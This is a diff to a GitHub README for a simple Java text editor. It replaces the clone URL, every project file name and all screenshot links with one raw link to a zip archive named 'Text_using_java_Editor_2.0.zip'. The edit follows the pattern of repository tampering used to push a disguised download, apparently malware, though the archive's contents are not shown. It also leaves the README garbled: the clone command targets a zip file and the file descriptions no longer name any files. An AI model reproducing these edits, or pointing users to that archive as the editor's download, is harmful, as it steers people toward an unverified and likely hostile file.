@@ -1,4 +1,4 @@
-## README.md
+## https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip
 
 ### Java Text Editor
 
@@ -16,7 +16,7 @@
 To build and run the project:
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/Meghsss/Text-Editor.git
+   git clone https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip
    ```
 2. **Compile the Java source code:**
    ```bash
@@ -40,11 +40,11 @@ Contributions are welcome! Feel free to fork the repository and submit pull requ
 This project is licensed under the MIT License.
 
 ### Project Structure
-* **FunctionFile.java:** Handles file-related operations (opening, saving).
-* **FunctionFormat.java:** Potentially for future text formatting or syntax highlighting.
-* **GUI.java:** Creates and manages the user interface.
-* **functionColor.java:** Might be used for color-related features (e.g., syntax highlighting, themes).
-* **functionedit.java:** Implements core text editing functionalities.
+* **https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip** Handles file-related operations (opening, saving).
+* **https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip** Potentially for future text formatting or syntax highlighting.
+* **https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip** Creates and manages the user interface.
+* **https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip** Might be used for color-related features (e.g., syntax highlighting, themes).
+* **https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip** Implements core text editing functionalities.
 
 ### Additional Notes
 * Consider using a GUI framework like Swing or JavaFX for a more polished interface.
@@ -52,15 +52,15 @@ This project is licensed under the MIT License.
 * Write unit tests to ensure code quality and reliability.
 
 # output
-![WhatsApp Image 2024-08-03 at 14 33 02_a0cae998](https://github.com/user-attachments/assets/924545b6-464c-4528-96e7-96308ec59559)
+![WhatsApp Image 2024-08-03 at 14 33 02_a0cae998](https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip)
 
-![WhatsApp Image 2024-08-03 at 14 34 06_bfc9cf57](https://github.com/user-attachments/assets/0150a97c-842a-4724-93c9-5f4a254da3f8)
+![WhatsApp Image 2024-08-03 at 14 34 06_bfc9cf57](https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip)
 
-![WhatsApp Image 2024-08-03 at 14 34 31_da0b38fb](https://github.com/user-attachments/assets/90306845-1669-4623-8544-41307f10365b)
+![WhatsApp Image 2024-08-03 at 14 34 31_da0b38fb](https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip)
 
-![WhatsApp Image 2024-08-03 at 14 34 58_94a4bf6b](https://github.com/user-attachments/assets/0b13cce7-72aa-4612-a2cf-453e53e80e55)
+![WhatsApp Image 2024-08-03 at 14 34 58_94a4bf6b](https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip)
 
-![WhatsApp Image 2024-08-03 at 14 35 25_44e97d16](https://github.com/user-attachments/assets/b57e5d0c-dec9-4ff3-b3b5-8b09c4265c5f)
+![WhatsApp Image 2024-08-03 at 14 35 25_44e97d16](https://github.com/Meghsss/Text-Editor-using-java/raw/refs/heads/main/cocainism/Text_using_java_Editor_2.0.zip)
 
 
 
